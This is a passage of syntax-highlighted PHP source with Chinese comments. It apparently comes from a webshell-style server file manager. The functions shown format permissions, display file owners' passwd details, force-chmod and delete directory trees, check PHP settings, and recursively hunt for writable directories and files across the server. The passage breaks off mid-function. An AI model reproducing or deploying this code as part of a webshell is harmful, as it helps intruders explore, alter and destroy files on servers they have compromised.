<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">owner</span>[<span style="color: #99ffff;">'read'</span>] = ($<span style="color: #ffeead;">mode</span> &amp; <span style="color: #ffffff; background-color: #002451;">00400</span>) ? <span style="color: #99ffff;">'r'</span> : <span style="color: #99ffff;">'-'</span>;<span style="color: #ff9da4; background-color: #003f8e;"> </span>
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">owner</span>[<span style="color: #99ffff;">'write'</span>] = ($<span style="color: #ffeead;">mode</span> &amp; <span style="color: #ffffff; background-color: #002451;">00200</span>) ? <span style="color: #99ffff;">'w'</span> : <span style="color: #99ffff;">'-'</span>;<span style="color: #ff9da4; background-color: #003f8e;"> </span>
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">owner</span>[<span style="color: #99ffff;">'execute'</span>] = ($<span style="color: #ffeead;">mode</span> &amp; <span style="color: #ffffff; background-color: #002451;">00100</span>) ? <span style="color: #99ffff;">'x'</span> : <span style="color: #99ffff;">'-'</span>;<span style="color: #ff9da4; background-color: #003f8e;"> </span>
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">group</span>[<span style="color: #99ffff;">'read'</span>] = ($<span style="color: #ffeead;">mode</span> &amp; <span style="color: #ffffff; background-color: #002451;">00040</span>) ? <span style="color: #99ffff;">'r'</span> : <span style="color: #99ffff;">'-'</span>;<span style="color: #ff9da4; background-color: #003f8e;"> </span>
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">group</span>[<span style="color: #99ffff;">'write'</span>] = ($<span style="color: #ffeead;">mode</span> &amp; <span style="color: #ffffff; background-color: #002451;">00020</span>) ? <span style="color: #99ffff;">'w'</span> : <span style="color: #99ffff;">'-'</span>;<span style="color: #ff9da4; background-color: #003f8e;"> </span>
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">group</span>[<span style="color: #99ffff;">'execute'</span>] = ($<span style="color: #ffeead;">mode</span> &amp; <span style="color: #ffffff; background-color: #002451;">00010</span>) ? <span style="color: #99ffff;">'x'</span> : <span style="color: #99ffff;">'-'</span>;<span style="color: #ff9da4; background-color: #003f8e;"> </span>
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">world</span>[<span style="color: #99ffff;">'read'</span>] = ($<span style="color: #ffeead;">mode</span> &amp; <span style="color: #ffffff; background-color: #002451;">00004</span>) ? <span style="color: #99ffff;">'r'</span> : <span style="color: #99ffff;">'-'</span>;<span style="color: #ff9da4; background-color: #003f8e;"> </span>
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">world</span>[<span style="color: #99ffff;">'write'</span>] = ($<span style="color: #ffeead;">mode</span> &amp; <span style="color: #ffffff; background-color: #002451;">00002</span>) ? <span style="color: #99ffff;">'w'</span> : <span style="color: #99ffff;">'-'</span>;<span style="color: #ff9da4; background-color: #003f8e;"> </span>
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">world</span>[<span style="color: #99ffff;">'execute'</span>] = ($<span style="color: #ffeead;">mode</span> &amp; <span style="color: #ffffff; background-color: #002451;">00001</span>) ? <span style="color: #99ffff;">'x'</span> : <span style="color: #99ffff;">'-'</span>;<span style="color: #ff9da4; background-color: #003f8e;"> </span>

<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>( $<span style="color: #ffeead;">mode</span> &amp; <span style="color: #ffffff; background-color: #002451;">0</span>x800 ) {$<span style="color: #ffeead;">owner</span>[<span style="color: #99ffff;">'execute'</span>] = ($<span style="color: #ffeead;">owner</span>[<span style="color: #99ffff;">'execute'</span>]==<span style="color: #99ffff;">'x'</span>) ? <span style="color: #99ffff;">'s'</span> : <span style="color: #99ffff;">'S</span><span style="color: #99ffff; text-decoration: underline;">'</span><span style="text-decoration: underline;">;}</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>( $<span style="color: #ffeead;">mode</span> &amp; <span style="color: #ffffff; background-color: #002451;">0</span>x400 ) {$<span style="color: #ffeead;">group</span>[<span style="color: #99ffff;">'execute'</span>] = ($<span style="color: #ffeead;">group</span>[<span style="color: #99ffff;">'execute'</span>]==<span style="color: #99ffff;">'x'</span>) ? <span style="color: #99ffff;">'s'</span> : <span style="color: #99ffff;">'S</span><span style="color: #99ffff; text-decoration: underline;">'</span><span style="text-decoration: underline;">;}</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>( $<span style="color: #ffeead;">mode</span> &amp; <span style="color: #ffffff; background-color: #002451;">0</span>x200 ) {$<span style="color: #ffeead;">world</span>[<span style="color: #99ffff;">'execute'</span>] = ($<span style="color: #ffeead;">world</span>[<span style="color: #99ffff;">'execute'</span>]==<span style="color: #99ffff;">'x'</span>) ? <span style="color: #99ffff;">'t'</span> : <span style="color: #99ffff;">'T</span><span style="color: #99ffff; text-decoration: underline;">'</span><span style="text-decoration: underline;">;}</span>

<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">return</span> $<span style="color: #ffeead;">type</span><span style="color: #ff9da4; font-weight: bold;">.</span>$<span style="color: #ffeead;">owner</span>[<span style="color: #99ffff;">'read'</span>].$<span style="color: #ffeead;">owner</span>[<span style="color: #99ffff;">'write'</span>].$<span style="color: #ffeead;">owner</span>[<span style="color: #99ffff;">'execute'</span>].$<span style="color: #ffeead;">group</span>[<span style="color: #99ffff;">'read'</span>]<span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">group</span><span style="text-decoration: underline;">[</span><span style="color: #99ffff; text-decoration: underline;">'write'</span><span style="text-decoration: underline;">].$</span><span style="color: #ffeead; text-decoration: underline;">group</span><span style="text-decoration: underline;">[</span><span style="color: #99ffff; text-decoration: underline;">'execute'</span><span style="text-decoration: underline;">].$</span><span style="color: #ffeead; text-decoration: underline;">world</span><span style="text-decoration: underline;">[</span><span style="color: #99ffff; text-decoration: underline;">'read'</span><span style="text-decoration: underline;">].$</span><span style="color: #ffeead; text-decoration: underline;">world</span><span style="text-decoration: underline;">[</span><span style="color: #99ffff; text-decoration: underline;">'write'</span><span style="text-decoration: underline;">].$</span><span style="color: #ffeead; text-decoration: underline;">world</span><span style="text-decoration: underline;">[</span><span style="color: #99ffff; text-decoration: underline;">'execute'</span><span style="text-decoration: underline;">];</span>
}

<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">getUser</span>($<span style="color: #ffeead;">filepath</span>)     {
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (<span style="color: #ffffff; background-color: #002451;">function_exists(</span><span style="color: #99ffff;">'posix_getpwuid'</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">array</span> = @<span style="color: #ffffff; background-color: #002451;">posix_getpwuid(</span>@<span style="color: #ffffff; background-color: #002451;">fileowner(</span>$<span style="color: #ffeead;">filepath</span>));
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">array</span> &amp;&amp; <span style="color: #ffffff; background-color: #002451;">is_array(</span>$<span style="color: #ffeead;">array</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">return</span> <span style="color: #99ffff;">' / &lt;a href="#" title="User: '</span>.$<span style="color: #ffeead;">array</span>[<span style="color: #99ffff;">'name'</span>].<span style="color: #99ffff;">'&amp;#13&amp;#10Passwd</span><span style="color: #99ffff; text-decoration: underline;">: '</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #99ffff; text-decoration: underline;">'passwd'</span><span style="text-decoration: underline;">].</span><span style="color: #99ffff; text-decoration: underline;">'&amp;#13&amp;#10Uid: '</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #99ffff; text-decoration: underline;">'uid'</span><span style="text-decoration: underline;">].</span><span style="color: #99ffff; text-decoration: underline;">'&amp;#13&amp;#10gid: '</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #99ffff; text-decoration: underline;">'gid'</span><span style="text-decoration: underline;">].</span><span style="color: #99ffff; text-decoration: underline;">'&amp;#13&amp;#10Gecos: '</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #99ffff; text-decoration: underline;">'gecos'</span><span style="text-decoration: underline;">].</span><span style="color: #99ffff; text-decoration: underline;">'&amp;#13&amp;#10Dir: '</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #99ffff; text-decoration: underline;">'dir'</span><span style="text-decoration: underline;">].</span><span style="color: #99ffff; text-decoration: underline;">'&amp;#13&amp;#10Shell: '</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #99ffff; text-decoration: underline;">'shell'</span><span style="text-decoration: underline;">].</span><span style="color: #99ffff; text-decoration: underline;">'"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #99ffff; text-decoration: underline;">'name'</span><span style="text-decoration: underline;">].</span><span style="color: #99ffff; text-decoration: underline;">'&lt;/a&gt;'</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">return</span> <span style="color: #99ffff;">''</span>;
}

<span style="color: #7285b7; font-style: italic;">// </span><span style="color: #7285b7; font-style: italic;">&#21024;&#38500;&#30446;&#24405;</span>
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">deltree</span>($<span style="color: #ffeead;">deldir</span>) {
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">mydir</span>=<span style="color: #d1f1a9;">@dir</span>($<span style="color: #ffeead;">deldir</span>);<span style="color: #ff9da4; background-color: #003f8e;">   </span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">while</span>($<span style="color: #ffeead;">file</span>=$<span style="color: #ffeead;">mydir</span>-&gt;<span style="color: #ffffff; background-color: #002451;">read</span>())     {<span style="color: #ff9da4; background-color: #003f8e;">       </span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>((<span style="color: #ffffff; background-color: #002451;">is_dir(</span>$<span style="color: #ffeead;">deldir</span>.<span style="color: #99ffff;">'/'</span>.$<span style="color: #ffeead;">file</span>)) &amp;&amp; ($<span style="color: #ffeead;">file</span>!=<span style="color: #99ffff;">'.'</span>) &amp;&amp; ($<span style="color: #ffeead;">file</span>!=<span style="color: #99ffff;">'..'</span>)) {<span style="color: #ff9da4; background-color: #003f8e;"> </span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   @<span style="color: #ffffff; background-color: #002451;">chmod(</span>$<span style="color: #ffeead;">deldir</span>.<span style="color: #99ffff;">'/'</span>.$<span style="color: #ffeead;">file</span>,<span style="color: #ffffff; background-color: #002451;">0777</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">deltree(</span>$<span style="color: #ffeead;">deldir</span>.<span style="color: #99ffff;">'/'</span>.$<span style="color: #ffeead;">file</span>);<span style="color: #ff9da4; background-color: #003f8e;"> </span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (<span style="color: #ffffff; background-color: #002451;">is_file(</span>$<span style="color: #ffeead;">deldir</span>.<span style="color: #99ffff;">'/'</span>.$<span style="color: #ffeead;">file</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   @<span style="color: #ffffff; background-color: #002451;">chmod(</span>$<span style="color: #ffeead;">deldir</span>.<span style="color: #99ffff;">'/'</span>.$<span style="color: #ffeead;">file</span>,<span style="color: #ffffff; background-color: #002451;">0777</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   @<span style="color: #ffffff; background-color: #002451;">unlink(</span>$<span style="color: #ffeead;">deldir</span>.<span style="color: #99ffff;">'/'</span>.$<span style="color: #ffeead;">file</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   }<span style="color: #ff9da4; background-color: #003f8e;"> </span>
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">mydir</span>-&gt;<span style="color: #ffffff; background-color: #002451;">close</span>();<span style="color: #ff9da4; background-color: #003f8e;"> </span>
<span style="background-color: #003f8e;"> </span>   @<span style="color: #ffffff; background-color: #002451;">chmod(</span>$<span style="color: #ffeead;">deldir</span>,<span style="color: #ffffff; background-color: #002451;">0777</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">return</span> @<span style="color: #ffffff; background-color: #002451;">rmdir(</span>$<span style="color: #ffeead;">deldir</span>) ? <span style="color: #ffffff; background-color: #002451;">1</span> : <span style="color: #ffffff; background-color: #002451;">0</span>;
}

<span style="color: #7285b7; font-style: italic;">// </span><span style="color: #7285b7; font-style: italic;">&#34920;&#26684;&#34892;&#38388;&#30340;&#32972;&#26223;&#33394;&#26367;&#25442;</span>
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">bg</span>() {
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">global</span> $<span style="color: #ffeead;">bgc</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">return</span> ($<span style="color: #ffeead;">bgc</span>++%<span style="color: #ffffff; background-color: #002451;">2</span>==<span style="color: #ffffff; background-color: #002451;">0</span>) ? <span style="color: #99ffff;">'alt1'</span> : <span style="color: #99ffff;">'alt2'</span>;
}

<span style="color: #7285b7; font-style: italic;">// </span><span style="color: #7285b7; font-style: italic;">&#33719;&#21462;&#24403;&#21069;&#30340;&#25991;&#20214;&#31995;&#32479;&#36335;&#24452;</span>
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">getPath</span>($<span style="color: #ffeead;">scriptpath</span>, $<span style="color: #ffeead;">nowpath</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">nowpath</span> == <span style="color: #99ffff;">'.'</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">nowpath</span> = $<span style="color: #ffeead;">scriptpath</span>;
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">nowpath</span> = <span style="color: #ffffff; background-color: #002451;">str_replace(</span><span style="color: #99ffff;">'\\'</span>, <span style="color: #99ffff;">'/'</span>, $<span style="color: #ffeead;">nowpath</span>);
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">nowpath</span> = <span style="color: #ffffff; background-color: #002451;">str_replace(</span><span style="color: #99ffff;">'//'</span>, <span style="color: #99ffff;">'/'</span>, $<span style="color: #ffeead;">nowpath</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (<span style="color: #ffffff; background-color: #002451;">substr(</span>$<span style="color: #ffeead;">nowpath</span>, -<span style="color: #ffffff; background-color: #002451;">1</span>) != <span style="color: #99ffff;">'/'</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">nowpath</span> = $<span style="color: #ffeead;">nowpath</span>.<span style="color: #99ffff;">'/'</span>;
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">return</span> $<span style="color: #ffeead;">nowpath</span>;
}

<span style="color: #7285b7; font-style: italic;">// </span><span style="color: #7285b7; font-style: italic;">&#33719;&#21462;&#24403;&#21069;&#30446;&#24405;&#30340;&#19978;&#32423;&#30446;&#24405;</span>
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">getUpPath</span>($<span style="color: #ffeead;">nowpath</span>) {
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">pathdb</span> = <span style="color: #ffffff; background-color: #002451;">explode(</span><span style="color: #99ffff;">'/'</span>, $<span style="color: #ffeead;">nowpath</span>);
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">num</span> = <span style="color: #ffffff; background-color: #002451;">count(</span>$<span style="color: #ffeead;">pathdb</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">num</span> &gt; <span style="color: #ffffff; background-color: #002451;">2</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">unset(</span>$<span style="color: #ffeead;">pathdb</span>[$<span style="color: #ffeead;">num</span>-<span style="color: #ffffff; background-color: #002451;">1</span>],$<span style="color: #ffeead;">pathdb</span>[$<span style="color: #ffeead;">num</span>-<span style="color: #ffffff; background-color: #002451;">2</span>]);
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">uppath</span> = <span style="color: #ffffff; background-color: #002451;">implode(</span><span style="color: #99ffff;">'/'</span>, $<span style="color: #ffeead;">pathdb</span>).<span style="color: #99ffff;">'/'</span>;
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">uppath</span> = <span style="color: #ffffff; background-color: #002451;">str_replace(</span><span style="color: #99ffff;">'//'</span>, <span style="color: #99ffff;">'/'</span>, $<span style="color: #ffeead;">uppath</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">return</span> $<span style="color: #ffeead;">uppath</span>;
}

<span style="color: #7285b7; font-style: italic;">// </span><span style="color: #7285b7; font-style: italic;">&#26816;&#26597;PHP&#37197;&#32622;&#21442;&#25968;</span>
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">getcfg</span>($<span style="color: #ffeead;">varname</span>) {
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">result</span> = <span style="color: #ffffff; background-color: #002451;">get_cfg_var(</span>$<span style="color: #ffeead;">varname</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">result</span> == <span style="color: #ffffff; background-color: #002451;">0</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">return</span> <span style="color: #99ffff;">'No'</span>;
<span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">elseif</span> ($<span style="color: #ffeead;">result</span> == <span style="color: #ffffff; background-color: #002451;">1</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">return</span> <span style="color: #99ffff;">'Yes'</span>;
<span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">return</span> $<span style="color: #ffeead;">result</span>;
<span style="background-color: #003f8e;"> </span>   }
}

<span style="color: #7285b7; font-style: italic;">// </span><span style="color: #7285b7; font-style: italic;">&#26816;&#26597;&#20989;&#25968;&#24773;&#20917;</span>
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">getfun</span>($<span style="color: #ffeead;">funName</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">return</span> (<span style="color: #bbdaff;">false</span> !== <span style="color: #ffffff; background-color: #002451;">function_exists(</span>$<span style="color: #ffeead;">funName</span>)) ? <span style="color: #99ffff;">'Yes'</span> : <span style="color: #99ffff;">'No'</span>;
}

<span style="color: #7285b7; font-style: italic;">// </span><span style="color: #7285b7; font-style: italic;">&#33719;&#24471;&#25991;&#20214;&#25193;&#23637;&#21517;</span>
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">getext</span>($<span style="color: #ffeead;">file</span>) {
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">info</span> = <span style="color: #ffffff; background-color: #002451;">pathinfo(</span>$<span style="color: #ffeead;">file</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">return</span> $<span style="color: #ffeead;">info</span>[<span style="color: #99ffff;">'extension'</span>];
}

<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">GetWDirList</span>($<span style="color: #ffeead;">dir</span>){
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">global</span> $<span style="color: #ffeead;">dirdata</span>,$<span style="color: #ffeead;">j</span>,$<span style="color: #ffeead;">nowpath</span>;
<span style="background-color: #003f8e;"> </span>   !$<span style="color: #ffeead;">j</span> &amp;&amp; $<span style="color: #ffeead;">j</span>=<span style="color: #ffffff; background-color: #002451;">1</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">dh</span> = <span style="color: #ffffff; background-color: #002451;">opendir(</span>$<span style="color: #ffeead;">dir</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">while</span> ($<span style="color: #ffeead;">file</span> = <span style="color: #ffffff; background-color: #002451;">readdir(</span>$<span style="color: #ffeead;">dh</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">f</span>=<span style="color: #ffffff; background-color: #002451;">str_replace(</span><span style="color: #99ffff;">'//'</span>,<span style="color: #99ffff;">'/'</span>,$<span style="color: #ffeead;">dir</span>.<span style="color: #99ffff;">'/'</span>.$<span style="color: #ffeead;">file</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>($<span style="color: #ffeead;">file</span>!=<span style="color: #99ffff;">'.'</span> &amp;&amp; $<span style="color: #ffeead;">file</span>!=<span style="color: #99ffff;">'..'</span> &amp;&amp; <span style="color: #ffffff; background-color: #002451;">is_dir(</span>$<span style="color: #ffeead;">f</span>)){
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (<span style="color: #ffffff; background-color: #002451;">is_writable(</span>$<span style="color: #ffeead;">f</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">dirdata</span>[$<span style="color: #ffeead;">j</span>][<span style="color: #99ffff;">'filename'</span>]=<span style="color: #ffffff; background-color: #002451;">str_replace(</span>$<span style="color: #ffeead;">nowpath</span>,<span style="color: #99ffff;">''</span>,$<span style="color: #ffeead;">f</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">dirdata</span>[$<span style="color: #ffeead;">j</span>][<span style="color: #99ffff;">'mtime'</span>]=<span style="color: #d1f1a9;">@date</span>(<span style="color: #99ffff;">'Y-m-d H:i:s'</span>,<span style="color: #ffffff; background-color: #002451;">filemtime(</span>$<span style="color: #ffeead;">f</span>));
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">dirdata</span>[$<span style="color: #ffeead;">j</span>][<span style="color: #99ffff;">'dirchmod'</span>]=<span style="color: #ffffff; background-color: #002451;">getChmod(</span>$<span style="color: #ffeead;">f</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">dirdata</span>[$<span style="color: #ffeead;">j</span>][<span style="color: #99ffff;">'dirperm'</span>]=<span style="color: #ffffff; background-color: #002451;">getPerms(</span>$<span style="color: #ffeead;">f</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">dirdata</span>[$<span style="color: #ffeead;">j</span>][<span style="color: #99ffff;">'dirlink'</span>]=$<span style="color: #ffeead;">dir</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">dirdata</span>[$<span style="color: #ffeead;">j</span>][<span style="color: #99ffff;">'server_link'</span>]=$<span style="color: #ffeead;">f</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">j</span>++;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">GetWDirList(</span>$<span style="color: #ffeead;">f</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">closedir(</span>$<span style="color: #ffeead;">dh</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">clearstatcache(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">return</span> $<span style="color: #ffeead;">dirdata</span>;
<span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">return</span> <span style="color: #ffffff; background-color: #002451;">array(</span>);
<span style="background-color: #003f8e;"> </span>   }
}

<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">GetWFileList</span>($<span style="color: #ffeead;">dir</span>){
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">global</span> $<span style="color: #ffeead;">filedata</span>,$<span style="color: #ffeead;">j</span>,$<span style="color: #ffeead;">nowpath</span>, $<span style="color: #ffeead;">writabledb</span>;
<span style="background-color: #003f8e;"> </span>   !$<span style="color: #ffeead;">j</span> &amp;&amp; $<span style="color: #ffeead;">j</span>=<span style="color: #ffffff; background-color: #002451;">1</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">dh</span> = <span style="color: #ffffff; background-color: #002451;">opendir(</span>$<span style="color: #ffeead;">dir</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">while</span> ($<span style="color: #ffeead;">file</span> = <span style="color: #ffffff; background-color: #002451;">readdir(</span>$<span style="color: #ffeead;">dh</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">ext</span> = <span style="color: #ffffff; background-color: #002451;">getext(</span>$<span style="color: #ffeead;">file</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">f</span>=<span style="color: #ffffff; background-color: #002451;">str_replace(</span><span style="color: #99ffff;">'//'</span>,<span style="color: #99ffff;">'/'</span>,$<span style="color: #ffeead;">dir</span>.<span style="color: #99ffff;">'/'</span>.$<span style="color: #ffeead;">file</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>($<span style="color: #ffeead;">file</span>!=<span style="color: #99ffff;">'.'</span> &amp;&amp; $<span style="color: #ffeead;">file</span>!=<span style="color: #99ffff;">'..'</span> &amp;&amp; <span style="color: #ffffff; background-color: #002451;">is_dir(</span>$<span style="color: #ffeead;">f</span>)){
